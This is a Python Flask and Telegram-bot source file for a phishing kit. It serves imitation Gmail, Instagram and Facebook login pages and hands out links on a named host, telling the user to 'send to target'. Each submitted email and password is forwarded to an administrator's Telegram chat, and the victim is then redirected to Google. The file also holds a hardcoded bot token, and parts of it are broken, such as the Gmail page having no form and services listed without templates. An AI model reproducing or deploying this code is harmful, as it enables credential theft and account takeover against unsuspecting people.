from flask import Flask, request
import os
import requests
import threading
import time
import json

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
running = True
last_update_id = 0

# SERVICE TEMPLATES - 100% REAL LOOK!
TEMPLATES = {
    'gmail': '''
<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*,body{{margin:0;padding:0}}body,a{{font:14px/1.4 Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:#202124}}body{{background-color:#fff;min-width:320px;min-height:100vh;position:relative}}a{text-decoration:none}.L3AGLb{background-color:#fff;border-radius:8px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);margin:72px auto 32px;max-width:396px;padding:48px 40px 36px;width:100%}.Zr4Dfc{background-color:#1a73e8;border:0;border-radius:4px;color:#fff;cursor:pointer;font-family:Google Sans,Roboto,Arial,sans-serif;font-size:14px;font-weight:500;height:40px;letter-spacing:.25px;line-height:1.5;outline:none;padding:0 24px;width:100%}.Zr4Dfc:focus{border:2px solid #1a73e8;border-radius:4px;box-shadow:0 0 0 1px #1a73e8}.whsOnd{z-index:500;position:fixed;left:0;right:0;bottom:16px;width:100%;max-width:396px;margin:0 auto}.Fc4wDb{margin:16px 0 8px;font-size:24px;line-height:32px;font-weight:400;letter-spacing:.2px}.RveJGb{color:#d93025;font-size:12px;margin-top:4px}.F9GWOe{margin-top:16px;font-size:12px}.gyM9xe{font-size:14px;margin-bottom:24px}.M9Ixxb{margin-bottom:12px}.BHz3Qd{padding:16px 0}.BHz3Qd input{border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;font-size:16px;height:44px;margin-bottom:8px;outline:none;padding:0 16px;width:100%}.BHz3Qd input:focus{border:1px solid #1a73e8;box-shadow:0 0 0 1px #1a73e8}.logo{background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgxIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTgxIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xNzguMjM5IDE5Ljk1OFYxNS43ODlIMTU1LjY5OFYxOS45NThIMTU5LjkwNlY0MC4yOTZIMTUzLjg1OFgyLjY2NlY0NC4yMTZIMTUzLjg1OFY0Ny4zOTZIMTU5LjkwNlY0NC4yMTZIMTc4LjIzOVY0MC4yOTZIMTc0LjAyOXYtMjAuMzM4SDE3OC4yMzlaTTE0NS4wMTUgMTQuNDg5SDExMi40NzJWMTEuMzcySDk2LjExMjZWMjAuNTQ4SDExMi40NzJWMjMuNzE4SDkyLjA5NTZWNDcuMzk2SDk2LjExMjZaTTc4LjY5MDcgMjAuNTQ4SDY0LjE1MDdWMjMuNzE4SDgwLjUxMDdWMjYuOTg4SDY0LjE1MDdWMjkuMTU4SDgwLjUxMDdWMzIuMzI4SDY0LjE1MDdWMzQuNDk4SDgwLjUxMDdWMzcuNjY4SDY0LjE1MDdWNDcuMzk2SDY4LjE2NzZWNDMuMjI4SDc4LjY5MDdWMjAuNTQ4Wk0xMzYuNzM2IDE2LjE2MkMxMzYuNzM2IDE0LjcyIDEzNS40MzEgMTMuNDEzIDEzMy45OTcgMTMuNDEzQzEzMi41NjMgMTMuNDEzIDEzMS4yNTYgMTQuNzIgMTMxLjI1NiAxNi4xNjJDMTMxLjI1NiAxNy41OTggMTMyLjU2MyAxOS4xMDUgMTMzLjk5NyAxOS4xMDVDMTM1LjQzMSAxOS4xMDUgMTM2LjczNiAxNy41OTggMTM2LjczNiAxNi4xNjJaIiBmaWxsPSIjNDI4NUY0Ii8+PC9zdmc+") no-repeat;font-size:0;height:24px;margin:0 0 16px 2px;width:66px}
</style>
</head>
<body>
<div class="L3AGLb">
<div class="logo"></div>
<div class="Fc4wDb">Sign in</div>
<div class="gyM9xe">Use your Google Account</div>
<div class="BHz3Qd">
<input name="email" placeholder="Email or phone" type="email" required autocomplete="username">
</div>
<div class="BHz3Qd">
<input name="password" placeholder="Password" type="password" required autocomplete="current-password">
</div>
<button class="Zr4Dfc">Next</button>
<div class="F9GWOe">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
</div>
</body></html>''',

    'instagram': '''
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width">
<title>Instagram</title>
<style>
*{box-sizing:border-box}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arialsans-serif;margin:0;padding:0}.form{max-width:350px;margin:64px auto 32px;padding:0 32px}.logo{height:51px;background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyOTkiIGhlaWdodD0iMjA5IiB2aWV3Qm94PSIwIDAgMjk5IDIwOSI+PHBhdGggZmlsbD0iIzIxYzkzYSIgZD0iTTI5OCAxMDQuNWMwLTcuNS0uNS0xNC45LTJ-OTguMUw5MSAxMDQuNWMuNS02LjUuNy0xMi43Ljc-MTI3LjV6Ii8+PC9zdmc+");background-size:contain;margin:0 auto 54px;width:175px}.form-group{margin-bottom:16px}.form-group input{background:#efefef;border:0;border-radius:3px;color:#262626;font-size:14px;height:36px;padding:11px 15px;width:100%}.form-group input::placeholder{color:#8e8e8e}.login-btn{background:#0095f6;border:0;border-radius:5px;color:#fff;cursor:pointer;font-weight:600;height:30px;line-height:30px;margin-top:12px;text-align:center;width:100%}.footer{color:#8e8e8e;font-size:12px;margin-top:16px;text-align:center}
</style>
</head>
<body>
<div class="form">
<div class="logo"></div>
<form method="POST">
<div class="form-group">
<input name="email" type="text" placeholder="Phone number, username, or email" required>
</div>
<div class="form-group">
<input name="password" type="password" placeholder="Password" required>
</div>
<button class="login-btn">Log in</button>
</form>
<div class="footer">Get the app.<a href="#">Instagram from Facebook</a></div>
</div>
</body></html>''',

    'facebook': '''
<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width">
<title>Facebook - log in or sign up</title>
<style>
*{box-sizing:border-box}body{background:#f0f2f5;font-family:SFProDisplay-Regular,Helvetica,Arial,sans-serif;margin:0;padding:0}.container{max-width:980px;margin:0 auto;padding:20px}.login-card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);margin:0 auto 32px;max-width:396px;padding:20px}.logo{height:106px;margin:0 auto 24px;width:186px;background:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjA0IiBoZWlnaHQ9IjQ4IiB2aWV3Qm94PSIwIDAgMjA0IDQ4IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGZpbGw9IiMwMDg0ZmYiIGQ9Ik0xOTguNyA0NC4xYzAgMS42LTEuMyAyLjktMi45IDIuOUgxMC4yYy0xLjYgMC0yLjktMS4zLTIuOS0yLjlWMzguOWMwLTEuNiAxLjMtMi45IDIuOS0yLjlIMTk1LjdjMS42IDAgMi45IDEuMyAyLjkgMi45djUuMnptLTUuNiAwYzAgMS4xLS45IDIuMS0yLjEgMi4xaC0xMDIuNGMtMS4yIDAtMi4xLS45LTIuMS0ydi01LjJjMC0xLjEuOS0yLjEgMi4xLTIuMWgxMDIuNGMxLjIgMCAyLjEuOSAyLjEgMi4xdjUuMnptLTY4LjMgMGMwIC44LS42IDEuNS0xLjUgMS41SDE0LjljLS44IDAtMS41LS42LTEuNS0xLjVWNy43YzAtLjggNi0xLjUgMS41LTEuNWgxMDQuOGMuOCAwIDEuNS42IDEuNSAxLjV2MzYuNHoiLz48L3N2Zz4=")}.form-group{margin-bottom:8px}.form-group input{background:#fff;border:1px solid #ddd5db;border-radius:5px;color:#1d2129;font-size:17px;height:48px;padding:14px 16px;width:100%}.login-btn{background:#4267b2;border:0;border-radius:6px;color:#fff;cursor:pointer;font-size:20px;font-weight:bold;height:48px;margin-top:12px;width:100%}.forgot{margin-top:16px}.forgot a{color:#1877f2;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="login-card">
<div class="logo"></div>
<form method="POST">
<div class="form-group">
<input name="email" placeholder="Email or phone number" required>
</div>
<div class="form-group">
<input name="password" placeholder="Password" type="password" required>
</div>
<button class="login-btn">Log In</button>
</form>
<div class="forgot"><a href="#">Forgot Password?</a></div>
</div>
</div>
</body></html>'''
}

def send_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=5)
    except:
        pass

def answer_callback(query_id):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={'callback_query_id': query_id}, timeout=5)
    except:
        pass

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={'offset': last_update_id + 1, 'timeout': 20}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update:
                        msg = update['message']
                        cid = msg['chat']['id']
                        txt = msg.get('text', '').lower()
                        uid = str(msg['from']['id'])
                        
                        if '/start' in txt:
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "📧 GMAIL", "callback_data": f"gmail_{uid}"}],
                                    [{"text": "📸 INSTAGRAM", "callback_data": f"insta_{uid}"}],
                                    [{"text": "📘 FACEBOOK", "callback_data": f"fb_{uid}"}],
                                    [{"text": "👻 SNAPCHAT", "callback_data": f"snap_{uid}"}],
                                    [{"text": "💬 DISCORD", "callback_data": f"discord_{uid}"}],
                                    [{"text": "🎵 TIKTOK", "callback_data": f"tiktok_{uid}"}],
                                    [{"text": "🔐 MICROSOFT", "callback_data": f"ms_{uid}"}]
                                ]
                            }
                            send_msg(cid, f"🎉 <b>WELCOME KING! 👑</b>\n\n👇 <b>Click Service</b>", markup)
                        
                        if '/data' in txt and str(cid) == ADMIN_CHAT_ID:
                            if PHISHING_DATA:
                                recent = "\n".join([f"{d['service']}: <code>{d['email']} | {d['pass']}</code>" for d in PHISHING_DATA[-10:]])
                                send_msg(cid, f"<b>🎣 RECENT HITS:</b>\n\n{recent}")
                            else:
                                send_msg(cid, "📭 No captures yet")
                    
                    if 'callback_query' in update:
                        query = update['callback_query']
                        query_id = query['id']
                        cid = query['from']['id']
                        data = query['data']
                        
                        answer_callback(query_id)
                        
                        service, uid = data.split('_', 1)
                        url = f"https://myphish.onrender.com/phish/{service}/{uid}"
                        send_msg(cid, f"✅ <b>{service.upper()} PHISH READY!</b>\n\n🔗 <code>{url}</code>\n\n📱 Send to target!")
        except:
            pass
        time.sleep(1)

@app.route('/')
def home():
    return "<h1>🎣 PHISH KING LIVE! All services ready!</h1>"

@app.route('/phish/<service>/<int:user_id>')
def phish(service, user_id):
    html = TEMPLATES.get(service, TEMPLATES['gmail'])
    return html

@app.route('/phish/<service>/<int:user_id>', methods=['POST'])
def capture(service, user_id):
    data = {
        'email': request.form.get('email', request.form.get('username', '')),
        'pass': request.form.get('password', ''),
        'service': service.upper()
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(int(ADMIN_CHAT_ID), f"🎣 <b>{data['service']} HIT!</b>\n"
                                   f"📧 <code>{data['email']}</code>\n"
                                   f"🔑 <code>{data['pass']}</code>")
    
    return '''
<!DOCTYPE html>
<html><body style="background:#28a745;color:white;font-family:Arial;text-align:center;padding:100px;font-size:24px;">
✅ Login Success!<br>Redirecting...
<script>setTimeout(()=>location.href="https://www.google.com",2000)</script>
</body></html>'''

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
